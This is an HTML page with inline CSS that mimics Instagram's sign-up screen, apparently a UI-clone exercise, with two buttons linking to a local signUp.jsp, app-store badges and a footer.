
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Instagram</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { background: #fafafa; color: #262626; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .container { background: #fff; border: 1px solid #ddd; width: 350px; padding: 40px 20px; text-align: center; }
    .logo { font-family: 'Billabong', cursive; font-size: 2.5rem; margin-bottom: 20px; }
    .btn { display: block; width: 100%; padding: 8px 0; margin: 8px 0; border: none; border-radius: 4px; font-size: 1rem; cursor: pointer; }
    .btn-facebook { background: #385185; color: white; }
    .btn-signup { background: #0095f6; color: white; }
    .or { margin: 20px 0; display: flex; align-items: center; text-align: center; color: #999; }
    .or::before, .or::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
    .or:not(:empty)::before { margin-right: .5em; }
    .or:not(:empty)::after { margin-left: .5em; }
    .app-links img { height: 40px; margin: 5px; }
    .footer { margin-top: 20px; font-size: .8rem; color: #999; }
    .footer a { color: #00376b; text-decoration: none; font-weight: bold; }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">Instagram</div>
    <a href="signUp.jsp"><button class="btn btn-facebook">Log in with Facebook</button></a>
    <div class="or">OR</div>
    <a href="signUp.jsp"><button class="btn btn-signup">Sign up with Phone or Email</button></a>
    <p>Have an account? <a href="#">Log in</a></p>
    <div class="app-links">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
    </div>
  </div>
  <div class="footer">
    <p>Instagram from Meta</p>
  </div>
</body>
</html>